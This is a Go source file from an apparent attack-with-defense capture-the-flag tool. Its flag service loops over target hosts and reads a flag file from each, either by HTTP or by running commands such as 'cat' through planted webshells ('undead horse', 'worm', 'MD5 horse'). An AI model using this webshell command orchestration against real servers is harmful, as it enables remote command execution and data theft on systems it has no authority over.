package logic

import (
	"errors"
	"fmt"
	"path/filepath"
	"strings"

	"awd-h1m-pro/internal/config"
	"awd-h1m-pro/internal/netutil"
	"awd-h1m-pro/internal/util"
)

func NewFlagService(attackSvc *AttackService) *FlagService {
	cfg := config.Clone()
	return &FlagService{
		client:    netutil.NewClient(cfg.Shell.Proxy, getRequestTimeout()),
		attackSvc: attackSvc,
	}
}

func (s *FlagService) GetFlagsFromShellAndSave(pathTemplate string) ([]FlagResult, error) {
	targets, err := LoadTargetsFromOutput()
	if err != nil {
		return nil, err
	}
	results := make([]FlagResult, 0, len(targets))
	lines := make([]string, 0, len(targets))
	for _, target := range targets {
		flag, getErr := s.getFlagFromHTTP(target, pathTemplate)
		result := FlagResult{Target: target, Flag: flag, Success: getErr == nil}
		if getErr != nil {
			result.Message = getErr.Error()
		}
		if flag != "" {
			lines = append(lines, fmt.Sprintf("%s %s", target, flag))
		}
		results = append(results, result)
	}
	_ = util.AppendLines(filepath.Join(util.OutputDir(), "flag.txt"), lines)
	return results, nil
}

func (s *FlagService) GetFlagsFromShellAndSaveWithType(pathTemplate string, shellType ShellType, urlPass, pass, postField, command string) ([]FlagResult, error) {
	targets, err := LoadTargetsFromOutput()
	if err != nil {
		return nil, err
	}
	results := make([]FlagResult, 0, len(targets))
	lines := make([]string, 0, len(targets))
	for _, target := range targets {
		remotePath := validateRemotePath(resolvePathTemplate(pathTemplate, target))
		cmd := strings.TrimSpace(command)
		if cmd == "" {
			cmd = "cat " + shellQuote(remotePath)
		}
		flag, getErr := s.getFlagFromShell(target, shellType, remotePath, urlPass, pass, postField, cmd)
		result := FlagResult{Target: target, Flag: flag, Success: getErr == nil}
		if getErr != nil {
			result.Message = getErr.Error()
		}
		if flag != "" {
			lines = append(lines, fmt.Sprintf("%s %s", target, flag))
		}
		results = append(results, result)
	}
	_ = util.AppendLines(filepath.Join(util.OutputDir(), "flag.txt"), lines)
	return results, nil
}

func (s *FlagService) getFlagFromHTTP(target, pathTemplate string) (string, error) {
	rawURL := resolvePathTemplate(pathTemplate, target)
	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
		rawURL = buildURLForTargetPath(target, validateRemotePath(rawURL))
	}
	resp, err := s.client.R().Get(rawURL)
	if err != nil {
		netutil.LogHTTPError("GET", rawURL, nil, 0, err)
		return "", err
	}
	if resp != nil && resp.GetStatusCode() >= 400 {
		statusErr := fmt.Errorf("http %d: %s", resp.GetStatusCode(), strings.TrimSpace(resp.String()))
		netutil.LogHTTPError("GET", rawURL, nil, resp.GetStatusCode(), statusErr)
		return "", statusErr
	}
	return extractFlagFromResponse(resp.String())
}

func (s *FlagService) getFlagFromShell(target string, shellType ShellType, remotePath, urlPass, pass, postField, command string) (string, error) {
	_ = remotePath
	var (
		result CommandResult
		err    error
	)
	switch shellType {
	case ShellTypeUndead:
		result, err = s.attackSvc.ExecCommandViaUndeadHorse(target, command)
	case ShellTypeWorm:
		result, err = s.attackSvc.ExecCommandViaWormShell(target, command)
	case ShellTypeMD5:
		result, err = s.attackSvc.ExecCommandViaMd5Horse(target, urlPass, pass, postField, command)
	default:
		result, err = s.attackSvc.ExecCommandViaShell(target, command)
	}
	if err != nil {
		return "", err
	}
	return extractFlagFromResponse(result.Output)
}

func extractFlagFromResponse(resp string) (string, error) {
	resp = strings.TrimSpace(resp)
	if resp == "" {
		return "", fmt.Errorf("empty response")
	}
	lower := strings.ToLower(resp)
	badKeywords := []string{"not found", "404", "forbidden", "permission denied", "no such file", "error", "failed"}
	for _, keyword := range badKeywords {
		if strings.Contains(lower, keyword) {
			return "", errors.New(resp)
		}
	}
	lines := strings.Split(strings.ReplaceAll(resp, "\r\n", "\n"), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			return line, nil
		}
	}
	return "", fmt.Errorf("flag not found")
}

func validateRemotePath(path string) string {
	path = strings.TrimSpace(path)
	if path == "" {
		return "/flag"
	}
	if strings.Contains(path, "..") {
		path = strings.ReplaceAll(path, "..", "")
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	return path
}

func resolvePathTemplate(pathTemplate, target string) string {
	pathTemplate = strings.ReplaceAll(pathTemplate, "{ip}", target)
	pathTemplate = strings.ReplaceAll(pathTemplate, "{host}", target)
	pathTemplate = strings.ReplaceAll(pathTemplate, "%s", target)
	return pathTemplate
}
